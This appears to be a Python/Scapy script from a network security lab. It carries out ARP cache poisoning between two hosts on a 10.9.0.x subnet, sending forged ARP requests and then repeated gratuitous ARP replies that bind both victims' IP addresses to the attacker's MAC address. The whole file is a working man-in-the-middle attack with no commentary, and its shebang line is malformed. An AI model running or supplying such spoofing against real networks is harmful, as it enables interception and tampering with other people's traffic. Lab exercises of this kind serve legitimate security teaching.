#!/usr/bin/envpython3 
from scapy.all import * 

mip = "10.9.0.105"
aip = "10.9.0.5"
bip = "10.9.0.6"
mmac = "02:42:0a:09:00:69"
amac = "02:42:0a:09:00:05" 

def gratuitous_arp(ip):
    E=Ether()
    A=ARP() 
    A.op=2 #1forARPrequest;2forARPreply 
    A.pdst = ip
    A.hwsrc = mmac
    A.psrc = ip 
    E.dst = "ff:ff:ff:ff:ff:ff"
    pkt=E/A 
    sendp(pkt)
	
def initial_arp(srcip, dstip):
	E1=Ether() 
	A1=ARP() 
	A1.op=1 #1forARPrequest;2forARPreply 
	A1.pdst = dstip
	A1.psrc = srcip 
	A1.hwsrc = mmac
	E1.dst = "ff:ff:ff:ff:ff:ff"
	pkt1=E1/A1 
	sendp(pkt1)

initial_arp(aip, bip)
initial_arp(bip, aip)

i=0
while i<100:
    gratuitous_arp(bip)
    gratuitous_arp(aip)
    i=i+1
    time.sleep(5)

print("done")


